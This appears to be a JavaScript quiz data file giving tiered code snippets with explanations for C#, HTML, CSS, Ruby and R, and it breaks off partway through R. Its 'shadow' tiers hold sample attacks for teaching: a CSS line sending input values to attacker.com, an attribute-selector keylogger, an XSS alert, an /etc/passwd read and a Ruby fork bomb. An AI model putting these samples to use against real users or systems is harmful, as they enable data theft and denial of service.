                { ghost: `Func<int, int> square = x => x * x;`, output: "Lambda", explanation: "A lambda expression is an anonymous function that you can use to create delegates or expression tree types." },
                { ghost: `int[] numbers = { 1, 6 };\nvar query = from n in numbers\n            where n > 5\n            select n;`, output: "LINQ Query", explanation: "Language Integrated Query (LINQ) adds query capabilities to .NET languages, resembling SQL." }
            ],
            master: [
                { ghost: `List<int> l = new List<int>();\nl.Add(1);`, output: "List<int>", explanation: "List<T> is a strongly typed list of objects that can be accessed by index. It provides methods to search, sort, and manipulate lists." },
                { ghost: `Dictionary<string, int> d = new Dictionary<string, int>();\nd["a"] = 1;`, output: "Dictionary", explanation: "Dictionary<TKey, TValue> is a collection of keys and values. It allows fast lookups of values based on their keys." },
                { ghost: `HashSet<int> s = new HashSet<int>();\ns.Add(1);`, output: "HashSet", explanation: "HashSet<T> is a collection that contains no duplicate elements. It provides high-performance set operations." },
                { ghost: `Stack<int> s = new Stack<int>();\ns.Push(1);`, output: "Stack", explanation: "Stack<T> represents a last-in, first-out (LIFO) collection of objects." },
                { ghost: `Queue<int> q = new Queue<int>();\nq.Enqueue(1);`, output: "Queue", explanation: "Queue<T> represents a first-in, first-out (FIFO) collection of objects." },
                { ghost: `LinkedList<int> l = new LinkedList<int>();\nl.AddLast(1);`, output: "LinkedList", explanation: "LinkedList<T> is a doubly linked list. It allows for fast insertion and removal of elements." },
                { ghost: `SortedDictionary<int, string> s = new SortedDictionary<int, string>();`, output: "SortedDict", explanation: "SortedDictionary<TKey, TValue> is a collection of key/value pairs that are sorted on the key." },
                { ghost: `PriorityQueue<string, int> pq = new PriorityQueue<string, int>();`, output: "PriorityQueue", explanation: "PriorityQueue<TElement, TPriority> is a collection of items that have a value and a priority." },
                { ghost: `async Task<int> FetchDataAsync() {\n  await Task.Delay(1000);\n  return 1;\n}`, output: "Async Task", explanation: "The async and await keywords allow you to write asynchronous code that looks and behaves like synchronous code." },
                { ghost: `IEnumerable<int> GetNumbers() {\n  yield return 1;\n  yield return 2;\n}`, output: "Iterator", explanation: "An iterator is a method that uses the yield return keyword to return elements of a collection one at a time." }
            ],
            legend: [
                { ghost: `int[] arr = { 3, 1, 2 };\nArray.Sort(arr);`, output: "1, 2, 3", explanation: "Array.Sort sorts elements in a one-dimensional array. It uses the Introsort algorithm." },
                { ghost: `List<int> list = new List<int> { 1, 5, 9 };\nint index = list.BinarySearch(5);`, output: "Index found", explanation: "List<T>.BinarySearch searches the entire sorted List<T> for an element using the binary search algorithm." },
                { ghost: `List<int> list = new List<int> { 1, 6, 2 };\nvar q = list.OrderBy(x => x).Where(x => x > 5);`, output: "Filtered", explanation: "OrderBy and Where are LINQ extension methods used for sorting and filtering collections." },
                { ghost: `BitArray b = new BitArray(10);`, output: "Bits", explanation: "BitArray manages a compact array of bit values, which are represented as Booleans." },
                { ghost: `ObservableCollection<string> c = new ObservableCollection<string>();`, output: "Observed", explanation: "ObservableCollection<T> is a dynamic data collection that provides notifications when items get added, removed, or when the whole list is refreshed." },
                { ghost: `Expression<Func<int, bool>> e = x => x > 5;`, output: "Expression", explanation: "Expression trees represent code in a tree-like data structure, where each node is an expression." },
                { ghost: `Type t = typeof(int);`, output: "Type info", explanation: "Reflection provides objects (of type Type) that describe assemblies, modules, and types." },
                { ghost: `Span<int> s = stackalloc int[10];`, output: "Stack Span", explanation: "Span<T> provides a type-safe and memory-safe representation of a contiguous region of arbitrary memory." },
                { ghost: `int x = 10;\nunsafe {\n  int* p = &x;\n}`, output: "Pointer", explanation: "The unsafe keyword denotes an unsafe context, which is required for any operation involving pointers." },
                { ghost: `GC.Collect();`, output: "Collected", explanation: "Garbage Collection is an automatic memory management feature that reclaims memory occupied by objects that are no longer in use." }
            ],
            shadow: [
                { ghost: `// CLR Hosting API
int ret = CorBindToRuntimeEx(
    NULL, L"wks", 
    STARTUP_LOADER_SAFEMODE | STARTUP_CONCURRENT_GC, 
    CLSID_CorRuntimeHost, 
    IID_ICorRuntimeHost, 
    (void**)&pRuntimeHost
);
pRuntimeHost->Start();`, output: "Hosted", explanation: "The CLR (Common Language Runtime) is the virtual machine component of .NET that manages the execution of .NET programs." },
                { ghost: `AppDomain.CreateDomain("MyDomain");`, output: "Domain", explanation: "AppDomains provide an isolation boundary for security, reliability, and versioning, and for unloading assemblies." },
                { ghost: `[ComVisible(true)]\npublic class MyClass { public void Run() { Console.WriteLine("Running"); } }`, output: "COM Object", explanation: "COM Interop allows C# code to interact with COM components (like older C++ libraries) and vice versa." },
                { ghost: `int x = 10;\nint* p = &x;`, output: "Pointer", explanation: "Raw pointers can be used in unsafe blocks to access memory directly, bypassing type safety checks." },
                { ghost: `Span<int> block = stackalloc int[100];`, output: "Allocated", explanation: "The stackalloc keyword allocates a block of memory on the stack. This memory is automatically discarded when the method returns." },
                { ghost: `volatile int sharedVar;`, output: "Volatile", explanation: "The volatile keyword indicates that a field might be modified by multiple threads that are executing at the same time." },
                { ghost: `[MarshalAs(UnmanagedType.LPStr)]\nstring s;`, output: "Marshaled", explanation: "Marshaling is the process of creating a bridge between managed and unmanaged code, converting data types as needed." },
                { ghost: `// Hooking logic
IntPtr ptr = IntPtr.Zero;
Delegate target = null;
var original = Marshal.GetDelegateForFunctionPointer<Delegate>(ptr);
DetourTransactionBegin();
DetourUpdateThread(GetCurrentThread());
DetourAttach(ref original, target);
DetourTransactionCommit();`, output: "Hooked", explanation: "Hooking involves intercepting function calls, messages, or events between software components." },
                { ghost: `// Fody / PostSharp
[PropertyChanged.AddINotifyPropertyChangedInterface]
public class Person {
    public string Name { get; set; }
}`, output: "Weaved", explanation: "IL weaving is the process of injecting IL code into existing assemblies, often used for AOP (Aspect-Oriented Programming)." },
                { ghost: `typeof(void)`, output: "Void Type", explanation: "System.Void is a structure in the System namespace that indicates that a method does not return a value." }
            ]
        }
    },
    html: {
        name: "HTML",
        tiers: {
            beginner: [
                { ghost: `<h1>Hello</h1>`, output: <h1>Hello</h1>, explanation: "The <h1> tag defines the most important heading. HTML uses tags to structure content." },
                { ghost: `<p>Text</p>`, output: <p>Text</p>, explanation: "The <p> tag defines a paragraph of text. It automatically adds some space before and after." },
                { ghost: `<a href="#">Link</a>`, output: <a href="#">Link</a>, explanation: "The <a> tag defines a hyperlink. The 'href' attribute specifies the destination URL." },
                { ghost: `<img src="x" alt="img" />`, output: "Image", explanation: "The <img> tag embeds an image. 'src' is the image source, and 'alt' is alternative text." },
                { ghost: `<ul><li>Item</li></ul>`, output: <ul><li>Item</li></ul>, explanation: "<ul> creates an Unordered List (bullets). Each list item must be inside a <li> tag." },
                { ghost: `<div>Div</div>`, output: <div>Div</div>, explanation: "The <div> tag is a generic container for flow content. It has no semantic meaning but is used for grouping." },
                { ghost: `<span>Span</span>`, output: <span>Span</span>, explanation: "The <span> tag is a generic inline container. It's used to style parts of text." },
                { ghost: `<br />`, output: <br />, explanation: "The <br> tag inserts a single line break. It is an empty tag, meaning it has no closing tag." },
                { ghost: `<input type="text" />`, output: <input type="text" />, explanation: "The <input> tag creates an interactive control for user data. 'type' determines the input kind." },
                { ghost: `<button>Click</button>`, output: <button>Click</button>, explanation: "The <button> tag creates a clickable button, often used to submit forms or trigger scripts." }
            ],
            intermediate: [
                { ghost: `<table><tr><td>Data</td></tr></table>`, output: "Table", explanation: "The <table> tag defines an HTML table. Tr is for row, td for cell." },
                { ghost: `<form><input /></form>`, output: "Form", explanation: "The <form> tag is used to create an HTML form for user input." },
                { ghost: `<label for="id">Name</label>`, output: "Label", explanation: "The <label> tag defines a label for several form elements. It improves accessibility." },
                { ghost: `<select><option>Option 1</option></select>`, output: "Select", explanation: "The <select> element is used to create a drop-down list." },
                { ghost: `<textarea rows="4" cols="50"></textarea>`, output: "Textarea", explanation: "The <textarea> tag defines a multi-line text input control." },
                { ghost: `<iframe src="https://example.com"></iframe>`, output: "Iframe", explanation: "The <iframe> tag specifies an inline frame. It is used to embed another document within the current HTML document." },
                { ghost: `<meta charset="utf-8" />`, output: "Meta", explanation: "The <meta> tag defines metadata about an HTML document. Metadata is not displayed but is machine parsable." },
                { ghost: `<link rel="stylesheet" href="style.css" />`, output: "Link", explanation: "The <link> tag defines the relationship between the current document and an external resource (like CSS)." },
                { ghost: `<script src="script.js"></script>`, output: "Script", explanation: "The <script> tag is used to embed a client-side script (JavaScript)." },
                { ghost: `<style>body { color: red; }</style>`, output: "Style", explanation: "The <style> tag is used to define style information (CSS) for a document." }
            ],
            master: [
                { ghost: `<canvas id="myCanvas" width="200" height="100"></canvas>`, output: "Canvas", explanation: "The <canvas> element is used to draw graphics, on the fly, via scripting (usually JavaScript)." },
                { ghost: `<svg width="100" height="100"><circle cx="50" cy="50" r="40" /></svg>`, output: "SVG", explanation: "The <svg> tag defines a container for SVG (Scalable Vector Graphics)." },
                { ghost: `<video width="320" height="240" controls><source src="movie.mp4" type="video/mp4"></video>`, output: "Video", explanation: "The <video> tag specifies video, such as a movie clip or other video streams." },
                { ghost: `<audio controls><source src="audio.mp3" type="audio/mpeg"></audio>`, output: "Audio", explanation: "The <audio> tag is used to embed sound content in a document, such as music or other audio streams." },
                { ghost: `<dialog open>This is a dialog window</dialog>`, output: "Dialog", explanation: "The <dialog> tag defines a dialog box or subwindow." },
                { ghost: `<details><summary>Click to open</summary><p>Hidden content</p></details>`, output: "Details", explanation: "The <details> tag specifies additional details that the user can view or hide on demand." },
                { ghost: `<progress value="70" max="100"></progress>`, output: "Progress", explanation: "The <progress> tag represents the completion progress of a task." },
                { ghost: `<meter value="0.6"></meter>`, output: "Meter", explanation: "The <meter> tag defines a scalar measurement within a known range, or a fractional value." },
                { ghost: `<datalist id="browsers"><option value="Chrome"><option value="Firefox"></datalist>`, output: "Datalist", explanation: "The <datalist> tag specifies a list of pre-defined options for an <input> element." },
                { ghost: `<template><h2>Hidden Content</h2></template>`, output: "Template", explanation: "The <template> tag is used as a container to hold some HTML content hidden from the user when the page loads." }
            ],
            legend: [
                { ghost: `<my-element></my-element>`, output: "<Custom>", explanation: "Web Components allow you to create reusable custom elements (e.g. <my-element>) with their own functionality." },
                { ghost: `#shadow-root (open)`, output: "#shadow", explanation: "Shadow DOM provides encapsulation for DOM and CSS in a Web Component, keeping it separate from the main document." },
                { ghost: `<div role="button" aria-label="Close">X</div>`, output: "X", explanation: "ARIA (Accessible Rich Internet Applications) attributes help make web content more accessible to people with disabilities." },
                { ghost: `<div itemscope itemtype="http://schema.org/Person">Name: Jane</div>`, output: "Metadata", explanation: "Microdata allows you to nest metadata within existing content on web pages, helping search engines understand the content." },
                { ghost: `<link rel="manifest" href="/manifest.json">`, output: "PWA Ready", explanation: "The Web App Manifest is a JSON file that tells the browser about your Progressive Web App and how it should behave when installed." },
                { ghost: `<link rel="preload" href="style.css" as="style">`, output: "Preloaded", explanation: "Preloading (<link rel='preload'>) allows you to force the browser to request a resource early, which can improve performance." },
                { ghost: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'">`, output: "Secured", explanation: "Content Security Policy (CSP) is a security layer that helps detect and mitigate certain types of attacks, including XSS." },
                { ghost: `<meta name="viewport" content="width=device-width, initial-scale=1.0">`, output: "Mobile", explanation: "The viewport meta tag controls the layout on mobile browsers, ensuring pages render correctly on different screen sizes." },
                { ghost: `<picture><source media="(min-width:650px)" srcset="img_pink_flowers.jpg"><img src="img_flowers.jpg" alt="Flowers"></picture>`, output: "Responsive", explanation: "The <picture> and <source> tags allow you to specify different image sources for different screen sizes/resolutions." },
                { ghost: `<math><msqrt><mn>2</mn></msqrt></math>`, output: "√2", explanation: "MathML (Mathematical Markup Language) is a standard for displaying mathematical notation on the web." }
            ],
            shadow: [
                { ghost: `<script>alert('XSS')</script>`, output: "Alert!", explanation: "Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious scripts into web pages viewed by other users." },
                { ghost: `<iframe style="opacity:0"></iframe>`, output: "Invisible", explanation: "Clickjacking is a technique where an attacker tricks a user into clicking on something different from what the user perceives." },
                { ghost: `<a href="fake-bank.com">Login</a>`, output: "Fake Login", explanation: "Phishing is a fraudulent attempt to obtain sensitive information by disguising as a trustworthy entity." },
                { ghost: `<input type="checkbox" checked hidden /> Subscribe`, output: "Subscribed", explanation: "Dark patterns are user interface design choices that trick users into doing things they didn't mean to do." },
                { ghost: `// Canvas Fingerprinting`, output: "ID: 123", explanation: "Browser fingerprinting is a technique used to identify and track users based on their browser and device configuration." },
                { ghost: `<img src="tracking-pixel.gif" width="1" height="1" />`, output: "Tracked", explanation: "Tracking pixels and cookies are used by advertisers to track user behavior across different websites." },
                { ghost: `<div onmouseover="exploit()"></div>`, output: "Exploited", explanation: "HTML injection is a vulnerability where an attacker can inject arbitrary HTML code into a vulnerable web page." },
                { ghost: `<script src="polyfill.js"></script>`, output: "Patched", explanation: "Polyfills are code (usually JavaScript) used to provide modern functionality on older browsers that do not natively support it." },
                { ghost: `<marquee>Scroll</marquee>`, output: "Scroll", explanation: "Legacy HTML elements like <marquee> and <blink> are deprecated and should not be used in modern web development." },
                { ghost: `<area />`, output: "Empty", explanation: "Void elements (like <br>, <img>, <input>) cannot have any child nodes (i.e., nested elements or text nodes)." }
            ]
        }
    },
    css: {
        name: "CSS",
        tiers: {
            beginner: [
                { ghost: `p { color: red; }`, output: "Color", explanation: "The 'color' property sets the color of the text content." },
                { ghost: `body { background: #000; }`, output: "Bg", explanation: "The 'background' shorthand property sets all background style properties at once." },
                { ghost: `p { font-size: 16px; }`, output: "Font", explanation: "The 'font-size' property sets the size of the font. Pixels (px) are a common unit." },
                { ghost: `div { margin: 10px; }`, output: "Margin", explanation: "Margin creates space around elements, outside of any defined borders." },
                { ghost: `div { padding: 10px; }`, output: "Padding", explanation: "Padding creates space inside an element, between the content and the border." },
                { ghost: `div { border: 1px solid; }`, output: "Border", explanation: "The 'border' shorthand property sets the width, style, and color of an element's border." },
                { ghost: `div { width: 100px; }`, output: "Width", explanation: "The 'width' property sets the width of an element's content area." },
                { ghost: `div { height: 100px; }`, output: "Height", explanation: "The 'height' property sets the height of an element's content area." },
                { ghost: `h1 { text-align: center; }`, output: "Align", explanation: "The 'text-align' property specifies the horizontal alignment of text in an element." },
                { ghost: `span { display: block; }`, output: "Block", explanation: "The 'display' property specifies the display behavior (the type of rendering box) of an element." }
            ],
            intermediate: [
                { ghost: `display: flex;\njustify-content: center;\nalign-items: center;`, output: "Flex Center", explanation: "Flexbox is a one-dimensional layout method for arranging items in rows or columns. 'center' aligns items perfectly." },
                { ghost: `display: grid;\ngrid-template-columns: 1fr 1fr;`, output: "Grid 2-Col", explanation: "CSS Grid is a two-dimensional layout system. '1fr 1fr' creates two equal-width columns." },
                { ghost: `position: absolute;\ntop: 50%; left: 50%;`, output: "Absolute", explanation: "Absolute positioning removes an element from the document flow and positions it relative to its nearest positioned ancestor." },
                { ghost: `position: relative;\ntop: 10px;`, output: "Relative", explanation: "Relative positioning moves an element relative to its normal position, without affecting the layout of surrounding elements." },
                { ghost: `z-index: 10;`, output: "Layered", explanation: "The z-index property specifies the stack order of an element. Higher values are in front of lower values." },
                { ghost: `opacity: 0.5;`, output: "Semi-transparent", explanation: "Opacity sets the transparency level of an element, where 1 is fully visible and 0 is fully transparent." },
                { ghost: `box-shadow: 5px 5px 10px #888;`, output: "Shadowed", explanation: "Box-shadow adds shadow effects around an element's frame. You can specify offsets, blur, and color." },
                { ghost: `border-radius: 50%;`, output: "Circle", explanation: "Border-radius rounds the corners of an element. Setting it to 50% creates a circle if the element is square." },
                { ghost: `overflow: hidden;`, output: "Clipped", explanation: "Overflow specifies what happens if content overflows an element's box. 'hidden' clips the excess content." },
                { ghost: `cursor: pointer;`, output: "Hand Cursor", explanation: "The cursor property specifies the mouse cursor to be displayed when pointing over an element." }
            ],
            master: [
                { ghost: `transform: rotate(45deg) scale(1.2);`, output: "Transformed", explanation: "Transform modifies the coordinate space of the visual formatting model. It can rotate, scale, skew, or translate elements." },
                { ghost: `transition: all 0.3s ease-in-out;`, output: "Animated", explanation: "Transitions enable you to define the transition between two states of an element." },
                { ghost: `@keyframes spin {\n  from { transform: rotate(0deg); }\n  to { transform: rotate(360deg); }\n}`, output: "Spinning", explanation: "Keyframes control the intermediate steps in a CSS animation sequence." },
                { ghost: `@media (max-width: 600px) {\n  body { background: blue; }\n}`, output: "Responsive", explanation: "Media queries allow you to apply CSS styles depending on a device's general type or specific characteristics." },
                { ghost: `:root { --main-color: #ff0000; }\ncolor: var(--main-color);`, output: "Variable", explanation: "CSS Variables (Custom Properties) allow you to store specific values to be reused throughout a document." },
                { ghost: `width: calc(100% - 20px);`, output: "Calculated", explanation: "The calc() function allows you to perform calculations when specifying CSS property values." },
                { ghost: `filter: blur(5px) grayscale(100%);`, output: "Filtered", explanation: "The filter property defines visual effects (like blur and saturation) to an element." },
                { ghost: `backdrop-filter: blur(10px);`, output: "Glassmorphism", explanation: "Backdrop-filter applies graphical effects such as blurring or color shifting to the area behind an element." },
                { ghost: `clip-path: polygon(50% 0%, 0% 100%, 100% 100%);`, output: "Triangle", explanation: "Clip-path creates a clipping region that sets what part of an element should be shown." },
                { ghost: `mask-image: linear-gradient(black, transparent);`, output: "Masked", explanation: "Masking allows you to hide parts of an element by using another image or gradient as a mask." }
            ],
            legend: [
                { ghost: `perspective: 1000px;\ntransform: rotateX(45deg);`, output: "3D Space", explanation: "Perspective determines the distance between the z=0 plane and the user to give a 3D-positioned element some perspective." },
                { ghost: `mix-blend-mode: multiply;`, output: "Blended", explanation: "Mix-blend-mode sets how an element's content should blend with the content of the element's parent and the element's background." },
                { ghost: `grid-template-areas:\n  "header header"\n  "sidebar content";`, output: "Layout Area", explanation: "Grid areas allow you to name grid items and then reference them in grid-template-areas to create a layout." },
                { ghost: `display: grid;\ngrid-template-columns: subgrid;`, output: "Subgrid", explanation: "Subgrid allows a nested grid to share the tracks defined on its parent grid." },
                { ghost: `@container (min-width: 300px) {\n  .card { font-size: 1.5rem; }\n}`, output: "Container Query", explanation: "Container queries allow you to style elements based on the size of their containing element rather than the viewport." },
                { ghost: `.parent:has(.child) {\n  background: red;\n}`, output: "Parent Selected", explanation: "The :has() pseudo-class represents an element if any of the selectors passed as parameters match at least one element." },
                { ghost: `.card {\n  & .title { color: blue; }\n}`, output: "Nested", explanation: "CSS Nesting allows you to nest one style rule inside another, with the selector of the child rule relative to the selector of the parent." },
                { ghost: `@layer base, components;`, output: "Layered", explanation: "Cascade Layers give you control over the cascade and the order of precedence of your styles." },
                { ghost: `@scope (.card) to (.content) {\n  :scope { border: 1px solid; }\n}`, output: "Scoped", explanation: "Scoped CSS allows you to select elements within a specific subtree of the DOM." },
                { ghost: `paint(my-painter);`, output: "Houdini Paint", explanation: "CSS Houdini Paint API allows developers to write JavaScript functions that can draw directly into an element's background, border, or content." }
            ],
            shadow: [
                { ghost: `background: url('http://attacker.com/log?k=' + attr(value));`, output: "Exfiltration", explanation: "CSS Injection can be used to exfiltrate data (like attribute values) by triggering network requests." },
                { ghost: `input[value^="a"] { background: url('http://log?k=a'); }`, output: "Keylogger", explanation: "Attribute selectors can be used to infer user input character by character." },
                { ghost: `visibility: hidden; position: absolute;`, output: "Hidden", explanation: "Hidden elements can be used for tracking or to facilitate clickjacking attacks." },
                { ghost: `@media (min-width: 100px) { body { background: red; } }`, output: "Fingerprint", explanation: "Media queries can reveal device characteristics (screen size, resolution) to fingerprint users." },
                { ghost: `* { animation: crash 1s infinite; }`, output: "DoS", explanation: "Complex or infinite animations on all elements can cause browser resource exhaustion (Denial of Service)." },
                { ghost: `font-family: 'Flow Circular';`, output: "Obfuscated", explanation: "Using 'Flow' fonts or similar techniques can obscure text content while keeping the layout structure." },
                { ghost: `content: url(file:///etc/passwd);`, output: "Local File", explanation: "In vulnerable renderers, CSS might be tricked into accessing local files." },
                { ghost: `.btn::after { content: "Free"; }`, output: "Dark Pattern", explanation: "Injecting misleading content via pseudo-elements to trick users." },
                { ghost: `body { pointer-events: none; }`, output: "Click Block", explanation: "Disabling pointer events can prevent users from interacting with the page." },
                { ghost: `:empty { display: none; }`, output: "Void", explanation: "The :empty pseudo-class selects elements that have no children (including text nodes)." }
            ]
        }
    },
    ruby: {
        name: "Ruby",
        tiers: {
            beginner: [
                { ghost: `puts "Hello"`, output: "Hello", explanation: "The puts method prints text to the console and adds a new line at the end." },
                { 
                    ghost: `puts "Name?"; name = gets.chomp\nputs "Hi #{name}"`, 
                    output: "Hi Shadow", 
                    explanation: "gets reads a line from input. chomp removes the newline character. #{} interpolates variables.",
                    input: {
                        prompts: ["Enter Name: "],
                        handler: (args) => `Hi ${args[0]}`
                    }
                },
                { ghost: `x = 6\nif x > 5 end`, output: "Condition check", explanation: "If statements allow conditional execution. In Ruby, the 'end' keyword closes the block." },
                { ghost: `5.times { }`, output: "Loop complete", explanation: "Everything is an object in Ruby. Numbers have methods like .times to run a block repeatedly." },
                { ghost: `def method; end`, output: "Method defined", explanation: "The 'def' keyword is used to define a new method (function). It must be closed with 'end'." },
                { ghost: `[1, 2].each`, output: "Iteration", explanation: "Iterators like .each are the Ruby way to loop over collections. It's more common than for loops." },
                { ghost: `{a: 1}`, output: "{:a=>1}", explanation: "Hashes are key-value pairs. {a: 1} is a shorthand for {:a => 1}, using symbols as keys." },
                { ghost: `class A; end`, output: "Class defined", explanation: "Classes define objects. Class names must start with an uppercase letter." },
                { ghost: `attr_accessor :x`, output: "Accessor created", explanation: "attr_accessor automatically creates getter and setter methods for an instance variable." },
                { ghost: `require 'json'`, output: "true", explanation: "The require method loads external libraries or files. 'json' is part of the standard library." }
            ],
            intermediate: [
                { ghost: `5.times { |i| puts "* " * (i + 1) }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Ruby's 'times' loop is very expressive." },
                { ghost: `def run_block; yield; end`, output: "Block ran", explanation: "The 'yield' keyword executes the block passed to the method." },
                { ghost: `my_proc = Proc.new { puts "Call me" }`, output: "Proc created", explanation: "Procs are objects that hold blocks of code to be executed later." },
                { ghost: `lam = lambda { |x| x * 2 }`, output: "Lambda created", explanation: "Lambdas are like Procs but check argument count and return behaves differently." },
                { ghost: `module MathHelpers; PI = 3.14; end`, output: "Module defined", explanation: "Modules are collections of methods and constants. They cannot be instantiated." },
                { ghost: `class MyClass; include Enumerable; end`, output: "Mixin included", explanation: "'include' mixes in a module's methods as instance methods (Mixins)." },
                { ghost: `begin; 1/0; rescue ZeroDivisionError; puts "Err"; end`, output: "Err", explanation: "Rescue blocks handle exceptions raised within the begin block." },
                { ghost: `begin; x=1; ensure; puts "Done"; end`, output: "Done", explanation: "Ensure blocks always run, regardless of whether an exception occurred." },
                { ghost: `def to_s; super + "!"; end`, output: "Method override", explanation: "'super' calls the same method on the parent class." },
                { ghost: `def self.now; Time.now; end`, output: "Class method", explanation: "Defining a method on 'self' creates a class method (static method)." },
                { ghost: `status = :active`, output: ":active", explanation: "Symbols are immutable, reusable constants often used as identifiers or keys." }
            ],
            master: [
                { ghost: `def method_missing(m, *args); puts "Missing #{m}"; end`, output: "Missing foo", explanation: "method_missing is called when an object receives a message it can't handle." },
                { ghost: `define_method(:greet) { |name| "Hi #{name}" }`, output: "Method defined", explanation: "define_method allows creating methods dynamically at runtime." },
                { ghost: `String.class_eval { def shout; upcase + "!"; end }`, output: "Class modified", explanation: "class_eval evaluates code in the context of a class, allowing dynamic modification." },
                { ghost: `obj = Object.new\nobj.instance_variable_set(:@secret, "shh")\nobj.instance_eval { @secret }`, output: "Secret accessed", explanation: "instance_eval evaluates code in the context of an instance, accessing private state." },
                { ghost: `Point = Struct.new(:x, :y)`, output: "Struct defined", explanation: "Struct is a convenient way to bundle a number of attributes together." },
                { ghost: `f = Fiber.new { Fiber.yield 1; 2 }`, output: "Fiber created", explanation: "Fibers are primitives for implementing light weight cooperative concurrency." },
                { ghost: `t = Thread.new { puts "Async work" }`, output: "Thread started", explanation: "Ruby threads allow concurrent execution of code." },
                { ghost: `class List\n  include Enumerable\n  def each; yield 1; end\nend`, output: "Enumerable", explanation: "Implementing 'each' and including Enumerable gives you map, select, reduce, etc." },
                { ghost: `class Score\n  include Comparable\n  def <=>(other); 0; end\nend`, output: "Comparable", explanation: "Implementing '<=>' and including Comparable gives you <, >, ==, sort, etc." },
                { ghost: `obj = "test"\ndata = Marshal.dump(obj)`, output: "Serialized", explanation: "Marshal is Ruby's built-in serialization format for saving objects." }
            ],
            legend: [
                { ghost: `r = Ractor.new { puts "Parallel" }`, output: "Ractor started", explanation: "Ractors (Ruby Actors) enable true parallel execution without thread-safety issues." },
                { ghost: `TracePoint.trace(:call) { |tp| p tp }`, output: "#<TracePoint:call>", explanation: "TracePoint API allows you to hook into internal events like method calls." },
                { ghost: `ObjectSpace.each_object(String) { |s| puts s }`, output: "Iterating objects", explanation: "ObjectSpace allows traversing all living objects in the Ruby heap." },
                { ghost: `GC.start(full_mark: true)`, output: "GC ran", explanation: "Manually triggering the Garbage Collector for performance tuning." },
                { ghost: `module MyRefinements; refine String do; end; end\nusing MyRefinements`, output: "Refinement active", explanation: "Refinements allow patching classes only within a specific scope (file/module)." },
                { ghost: `m = String.instance_method(:upcase)`, output: "Method unbound", explanation: "UnboundMethods can be extracted from a class and bound to an object later." },
                { ghost: `x = 1\neval("x + 1", binding)`, output: "Eval in context", explanation: "Binding objects encapsulate the execution context (variables, self) at a specific point." },
                { ghost: `puts caller`, output: "Stack trace", explanation: "'caller' returns the current execution stack trace." },
                { ghost: `Ripper.sexp("x = 1")`, output: "S-expression", explanation: "Ripper is a Ruby script parser that allows you to inspect the AST." },
                { ghost: `RubyVM::MJIT.pause`, output: "JIT paused", explanation: "Controlling the JIT (Just-In-Time) compiler for performance optimization." }
            ],
            shadow: [
                { ghost: `class String; def size; 0; end; end`, output: "Core patched", explanation: "Monkey patching allows modifying core classes globally. This can break libraries that rely on standard behavior." },
                { ghost: `eval("puts 'Danger'")`, output: "Danger", explanation: "The 'eval' method executes a string as Ruby code. Using it with user input is a critical security vulnerability (RCE)." },
                { ghost: `payload = Marshal.dump("test")\nMarshal.load(payload)`, output: "Deserialized", explanation: "Unsafe deserialization using 'Marshal' can allow attackers to instantiate arbitrary objects and execute code." },
                { ghost: `class Middleware; def call(env); [200, {}, ['OK']]; end; end`, output: "Middleware", explanation: "Rack middleware intercepts every HTTP request/response. Malicious middleware can steal data or modify traffic." },
                { ghost: `require 'active_support/all'`, output: "Loaded", explanation: "Rails' ActiveSupport patches standard classes extensively. 'Magic' behavior can lead to subtle bugs or security issues." },
                { ghost: `def method_missing(m, *args); puts "Captured #{m}"; end`, output: "Captured", explanation: "Intercepting all method calls on an object using 'method_missing' allows creating powerful but opaque DSLs." },
                { ghost: `require 'ffi'; module Lib; extend FFI::Library; end`, output: "FFI Linked", explanation: "FFI (Foreign Function Interface) allows Ruby code to call functions in dynamic libraries (C/C++)." },
                { ghost: `Thread.new { loop { fork { } } }`, output: "Fork Bomb", explanation: "Creating infinite threads or processes can exhaust system resources (DoS)." },
                { ghost: `->(x){x*x}.curry[5]`, output: "Curried", explanation: "Currying transforms a function with multiple arguments into a sequence of functions each with a single argument." },
                { ghost: `BasicObject.new`, output: "Blank Slate", explanation: "BasicObject is the parent of all classes. It has almost no methods, making it ideal for proxy objects." }
            ]
        }
    },
    r: {
        name: "R",
        tiers: {
            beginner: [
                { ghost: `print("Hello")`, output: "Hello", explanation: "The print() function outputs the value of an object to the console." },
                { ghost: `x <- 10`, output: "10", explanation: "The arrow operator (<-) is the standard way to assign values to variables in R." },
                { ghost: `c(1, 2, 3)`, output: "1 2 3", explanation: "The c() function combines values into a vector or list. It stands for 'combine' or 'concatenate'." },
                { ghost: `x <- c(1, 5, 9)\nmean(x)`, output: "5", explanation: "R has many built-in statistical functions. mean() calculates the arithmetic mean of a vector." },
                { ghost: `x <- 1:10; y <- x^2\nplot(x, y)`, output: "Plot displayed", explanation: "plot() is a generic function for plotting R objects. It adapts its output based on the input data." },
                { ghost: `x <- TRUE\nif (x) {}`, output: "Condition met", explanation: "Conditional statements control program flow. The code block runs if the condition is TRUE." },
                { ghost: `v <- 1:5\nfor (i in v) {}`, output: "Loop done", explanation: "For loops iterate over elements in a sequence (like a vector or list)." },
                { ghost: `f <- function() { print("Hi") }; f()`, output: "Function defined", explanation: "Functions are created using the function() directive. They are first-class objects in R." },
                { ghost: `df <- data.frame(id = 1:5, name = c("A","B","C","D","E"))`, output: "Data Frame", explanation: "Data frames are the standard structure for storing tabular data (rows and columns)." },
                { ghost: `read.csv(text="x,y\n1,2")`, output: "Data loaded", explanation: "read.csv() is a common function to load data from Comma Separated Value files into a data frame." }
            ],
            intermediate: [
                { ghost: `m <- matrix(1:9, 3)\napply(m, 1, sum)`, output: "Row sums", explanation: "apply() executes a function on each row (1) or column (2) of a matrix." },
                { ghost: `l <- list(1, 2)\nlapply(l, function(x) x^2)`, output: "List of squares", explanation: "lapply() applies a function to every element of a list and returns a list." },
                { ghost: `l <- list(4, 9)\nsapply(l, sqrt)`, output: "Vector of roots", explanation: "sapply() is like lapply but attempts to simplify the result to a vector or matrix." },
                { ghost: `v <- 1:6; g <- gl(2, 3)\ntapply(v, g, mean)`, output: "Group means", explanation: "tapply() applies a function to subsets of a vector based on factor levels." },
                { ghost: `df <- data.frame(age=c(10, 20))\nsubset(df, age > 18)`, output: "Filtered data", explanation: "subset() returns rows of a data frame that meet a specific condition." },
                { ghost: `df1 <- data.frame(id=1); df2 <- data.frame(id=1)\nmerge(df1, df2, by="id")`, output: "Joined data", explanation: "merge() joins two data frames based on common columns (like SQL join)." },
                { ghost: `d <- data.frame(x=c(1,1), y=1:2)\naggregate(y ~ x, d, mean)`, output: "Aggregated", explanation: "aggregate() splits data into subsets, computes summary stats, and returns the result." },
